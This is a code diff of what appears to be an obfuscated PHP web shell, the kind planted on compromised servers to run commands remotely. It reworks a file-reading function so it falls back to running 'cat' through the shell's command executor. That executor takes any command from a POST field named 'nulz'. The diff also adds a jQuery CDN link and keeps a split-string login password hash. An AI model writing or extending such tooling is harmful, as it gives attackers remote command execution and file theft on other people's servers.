@@ -128,39 +128,6 @@ function deleteFile($fileName) {
         return false;
     }
 }
-function NuLzReadFile($this_file) {
-    global $func_exist;
-    global $f_get;
-    global $fo;
-    global $fr;
-    global $fc;
-    $cantread = 'Cant Not Read '.$this_file;
-    $content = '';
-    if ($func_exist($fo)) {
-        $fi_le = $fo($this_file, 'r');
-        if ($fi_le) {
-            while (!feof($fi_le)) {
-                $content .= $fr($fi_le, 8192);
-            }
-            $fc($fi_le);
-            return $content;
-        } else {
-            echo $cantread;
-            return false;
-        }
-    } elseif ($func_exist($f_get)) {
-        $content = $f_get($this_file);
-        if ($content) {
-            return $content;
-        } else {
-            echo $cantread;
-            return false;
-        }
-    } else {
-        echo $cantread;
-        return false;
-    }
-}
 function NuLzCmd($komendnya) {
     global $hayoloh;
     global $fw;
@@ -237,6 +204,45 @@ function NuLzCmd($komendnya) {
 if (isset($_POST['nulz'])) {
     $komendnya = $_POST['nulz'];
     echo NuLzCmd($komendnya);
+}
+function NuLzReadFile($this_file) {
+    global $func_exist;
+    global $f_get;
+    global $fo;
+    global $fr;
+    global $fc;
+    $cantread = 'Cant Not Read '.$this_file;
+    $content = '';
+    if ($func_exist($fo)) {
+        $fi_le = $fo($this_file, 'r');
+        if ($fi_le) {
+            while (!feof($fi_le)) {
+                $content .= $fr($fi_le, 8192);
+            }
+            $fc($fi_le);
+            if (empty($content)||!$content) {
+                $content = NuLzCmd('cat "'.addslashes($this_file).'"');
+            }
+            return $content;
+        } else {
+            echo $cantread;
+            return false;
+        }
+    } elseif ($func_exist($f_get)) {
+        $content = $f_get($this_file);
+        if ($content) {
+            if (empty($content)||!$content) {
+                $content = NuLzCmd('cat "'.addslashes($this_file).'"');
+            }
+            return $content;
+        } else {
+            echo $cantread;
+            return false;
+        }
+    } else {
+        echo $cantread;
+        return false;
+    }
 }
 function XaFV($FQS) { 
     global $gflate;
@@ -469,9 +475,11 @@ $uikit_css = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/css/uikit.m
 $uikit_rtl = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/css/uikit-rtl.min.css';
 $uikit_js = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/js/uikit.min.jss';
 $uikit_icon = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/js/uikit-icons.min.js';
-/*Jquery*/
+/*Jquery - Ajax*/
 $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';
+$ajax_version = '3.5.1';
+$ajax = 'https://ajax.googleapis.com/ajax/libs/jquery/'.$ajax_version.'/jquery.min.js';
 /*Login Page*/
 //login
 $passwd = 'a'.'2c'.'a3'.'75'.'6e'.'57'.'aa'.'5'.'90'.'06'.'5a'.'20'.'1b'.'72'.'e0'.'2a'.'55'.'34'.'15'.'53'.'bd';
